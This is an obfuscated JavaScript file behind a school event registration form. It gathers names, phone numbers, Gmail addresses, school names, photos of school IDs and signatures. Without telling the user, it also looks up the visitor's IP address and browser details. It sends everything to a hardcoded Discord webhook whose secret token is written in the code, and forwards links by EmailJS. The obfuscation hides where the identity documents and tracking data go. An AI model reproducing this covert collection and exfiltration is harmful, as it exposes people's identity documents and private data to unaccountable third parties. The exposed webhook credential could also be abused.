!function(){var e=["error","id_file","click","payload_json","trim","src","url","then","6sLPLKD","256px","text","No JSON response from Discord (likely 204).","registration_data_ssard","User","Failed to send data to Discord:","files[1]","Registration successful, but failed to send email links.","target","color","upload_section","style","warn","id_front.png","height","reuploadBtn","attachments","number","Please draw your signature.","qrBase64","https://api.ipify.org?format=json","red","signature.png","IP Address","init","email","message","template_t7ioajf","consentAcceptBtn","5FHIlpf","append","loadingOverlay","Name","setItem","SSDcjFdMjBWH15ZIq","upload","storedQR","name","draw_section","getItem","Email sent successfully!","result","Registration Bot","green","log","innerText","width","files[2]","Please attach the front of your school ID.","block","opacity","display","stringify","5207756xWeOHt","show","Invalid email address. Only Gmail addresses are allowed.","none","Device Info","send","remove","onload","hidden-start","files","608645BPZxsw","4034485vhfWAt","10187296mbCldN","active","mainContainer","alreadyRegisteredSection","registration_slots_left","charCodeAt","classList","Failed to load ID image. Please try again.","image/png","change","Error sending data to Discord:","toDataURL","querySelector","Invalid name. Only letters and spaces are allowed.","status","Registration successful! Please check your Gmail for confirmation.","Unknown","getElementById","borderRadius","Please enter your school name.","2222979ZKFdyy","json","8px","files[0]","slotsLeft","School","value","formSection","appendChild","innerHTML","add","flex","Number","test","clear","Registration is now closed. No slots left.","signature-pad","parse","textContent","qr_code.png","12905930agclQW","registeredName","Email","canvas","match","header","readAsDataURL","userAgent","reset","32210AMHEmF","Failed to retrieve IP address:","consentModal","18ogmgNQ","addEventListener","length","Invalid phone number. It must be a 10-digit number.","https://discord.com/api/webhooks/1325637445756256277/tVpZ_gEHaNbEjziqoN3OCLfcJ4OMymPXqFymJSzoFY9stI--aTvMbQWWCBKpnoI-lIZ5","Failed to send email:","checked","Please upload your signature.","onerror","POST","registrationForm"];function t(e,n){var r=a();return(t=function(e,t){return r[e-=250]})(e,n)}function a(){return e}!function(e,a){for(;;)try{var n=t;if(parseInt(n(271))/1+-parseInt(n(322))/2+parseInt(n(293))/3+parseInt(n(261))/4*(parseInt(n(374))/5)+-parseInt(n(344))/6*(parseInt(n(272))/7)+parseInt(n(273))/8+-parseInt(n(325))/9*(parseInt(n(313))/10)==751343)break;e().push(e().shift())}catch(r){e().push(e().shift())}}(a,751343);let n=t(329),r=t(372),i=t(379),s=t(348),l=t(277);emailjs[t(369)](i);let o=document[t(290)](t(324)),d=document[t(290)](t(373)),c=document.getElementById(t(376)),$=document[t(290)](t(275)),u=document[t(290)](t(318)),m=document[t(290)]("footer"),f=document[t(290)](t(300)),_=document[t(290)](t(335)),g=document[t(290)](t(371)),p=document[t(290)](t(380)),h=document[t(290)]("draw"),y=document[t(290)](t(355)),w=document[t(290)](t(383)),v=document[t(290)](t(307)),I=document[t(290)](t(276)),b=document[t(290)](t(314)),B=document.getElementById(t(381)),N=document[t(290)](t(360)),k=document[t(290)](t(381)),P=document.getElementById(t(297)),E=document.getElementById(t(309)),F=new SignaturePad(E);function R(){let e=t;p[e(331)]?(y[e(356)][e(259)]=e(257),w[e(356)].display="none"):(y.style.display=e(264),w.style.display="block")}async function q(e){var a,i,o,d,c,$,u;let m=t;e.preventDefault(),D(!0);let f,g=document[m(290)]("name").value.trim(),p=document[m(290)](m(362))[m(299)].trim(),h=document[m(290)](m(370))[m(299)][m(340)](),y=document[m(290)]("school_name")[m(299)][m(340)](),w=document[m(290)](m(337))[m(270)][0],v=document.querySelector('input[name="signature_type"]:checked')[m(299)],I=document[m(290)]("signature_file")[m(270)][0],b=(a=g,i=p,o=h,d=y,c=w,$=v,u=I,f=t,/^[A-Za-z\s]+$/[f(306)](a)?/^\d{10}$/[f(306)](i)?/^[^\s@]+@gmail\.com$/.test(o)?d?c?$!==f(380)||u?null:f(332):f(256):f(292):f(263):f(328):f(286));if(b){x(b,"red"),D(!1);return}let B="";if(v===m(380))try{B=await S(I)}catch(N){x("Failed to read signature file.",m(366)),D(!1);return}else{if(F.isEmpty()){x(m(363),"red"),D(!1);return}B=F[m(284)](m(281))}let P="";try{P=await S(w)}catch(E){x(m(280),m(366)),D(!1);return}let R=m(289),q=navigator[m(320)]||m(289);try{let C=await fetch(m(365));C.ok&&(R=(await C[m(294)]()).ip||m(289))}catch(O){console[m(357)](m(323),O)}k[m(302)]="",new QRCode(k,{text:JSON[m(260)]({name:g,number:p,email:h,schoolName:y,registered:!0}),width:256,height:256}),await new Promise(e=>setTimeout(e,500));let H=k[m(285)](m(316))[m(284)](m(281)),M=await j(H),T=await j(B),W=await j(P),Z=new FormData,Q={username:m(250),embeds:[{title:"New Registration",color:7103487,fields:[{name:m(377),value:g},{name:m(305),value:p},{name:m(315),value:h},{name:m(298),value:y},{name:m(368),value:R},{name:m(265),value:q},{name:"Registered",value:"âœ…"}],timestamp:new Date}]};Z.append(m(339),JSON[m(260)](Q)),Z[m(375)](m(296),M,m(312)),Z[m(375)](m(351),T,m(367)),Z.append(m(255),W,m(358));try{let U=await fetch(n,{method:m(334),body:Z});if(U.ok){let z="",J="",K="",G=null;try{G=await U[m(294)]()}catch(V){console[m(357)](m(347))}G&&G.attachments&&(G.attachments[0]&&(z=G[m(361)][0][m(342)]),G[m(361)][1]&&(J=G[m(361)][1][m(342)]),G[m(361)][2]&&(K=G[m(361)][2][m(342)]));let X={name:g,email:h,number:p,school_name:y,qr_image_url:z,signature_url:J,id_front_url:K,ip_address:R,device_info:q};emailjs[m(266)]("service_lsgqvja",r,X)[m(343)](function(e){let t=m;console[t(252)](t(385),e[t(287)],e[t(346)]),x(t(288),t(251));let a={name:g,email:h,number:p,schoolName:y,qrBase64:H};localStorage.setItem(s,JSON[t(260)](a));let n=parseInt(localStorage.getItem(l),10);n=n>0?n-1:0,localStorage.setItem(l,n),A(),_[t(321)](),F[t(307)](),D(!1),L(a)},function(e){let t=m;console[t(336)](t(330),e),x(t(352),"orange");let a={name:g,email:h,number:p,schoolName:y,qrBase64:H};localStorage[t(378)](s,JSON[t(260)](a));let n=parseInt(localStorage.getItem(l),10);n=n>0?n-1:0,localStorage[t(378)](l,n),A(),_[t(321)](),F.clear(),D(!1),L(a)})}else console.error(m(350),U.statusText),x("Failed to send registration data. Please try again later.",m(366)),D(!1)}catch(Y){console.error(m(283),Y),x("An error occurred. Please try again later.",m(366)),D(!1)}}function x(e,a){let n=t;g[n(253)]=e,g[n(356)][n(354)]=a,g[n(356)][n(258)]="1",setTimeout(()=>{let e=n;g[e(356)][e(258)]="0"},5e3)}function D(e){let a=t;e?c[a(279)][a(303)]("active"):c[a(279)].remove(a(274))}function L(e){let a=t,n;f[a(279)][a(303)](a(269)),f[a(279)][a(267)](a(262)),I[a(279)].remove(a(269)),I[a(279)][a(303)]("show"),b[a(311)]=e[a(382)]||a(349),B[a(302)]="",e[a(364)]&&((n=new Image)[a(341)]=e.qrBase64,n[a(356)][a(254)]=a(345),n.style[a(359)]=a(345),n.style[a(291)]=a(295),B[a(301)](n));0>=parseInt(localStorage[a(384)](l),10)&&x("All slots have been filled. Registration is now closed.",a(366))}function A(){let e=t,a=parseInt(localStorage.getItem(l),10);if(P.textContent=a>0?a:"0",a<=0){let n=JSON[e(310)](localStorage[e(384)](s))||null;n&&n[e(370)]||(f[e(279)][e(303)](e(269)),f.classList.remove(e(262)),x("Registration is now closed. No slots left.","red"))}}function S(e){return new Promise(function(a,n){let r=t,i=new FileReader;i[r(268)]=function(e){return a(e[r(353)][r(386)])},i[r(333)]=function(e){return n(e)},i[r(319)](e)})}function j(e){let a=t,n=e.split(","),r=n[0][a(317)](/:(.*?);/),i=r?r[1]:"",s=atob(n[1]),l=s[a(327)],o=new Uint8Array(l);for(;l--;)o[l]=s[a(278)](l);return new Blob([o],{type:i})}d[t(326)](t(338),function(){let e=t,a,n;o.style.display=e(264),a=t,localStorage[a(384)](l)||localStorage[a(378)](l,180),A(),(n=JSON.parse(localStorage[a(384)](s))||null)&&n[a(370)]?(o[a(356)][a(259)]=a(264),L(n)):parseInt(localStorage[a(384)](l),10)>0?o[a(356)][a(259)]=a(304):($[a(279)][a(303)](a(262)),u[a(279)][a(303)]("show"),m[a(279)][a(303)](a(262)),x(a(308),a(366))),o[a(356)].display&&"none"!==o[a(356)][a(259)]||($[a(279)].add("show"),u[a(279)][a(303)](a(262)),m[a(279)].add(a(262)))}),p[t(326)]("change",R),h[t(326)](t(282),R),v[t(326)](t(338),function(){F[t(307)]()}),N[t(326)]("click",function(){let e=t;I[e(279)][e(303)](e(269)),I[e(279)][e(267)](e(262)),f[e(279)][e(267)](e(269)),f.classList[e(303)](e(262)),g.innerText=""}),_[t(326)]("submit",q)}();
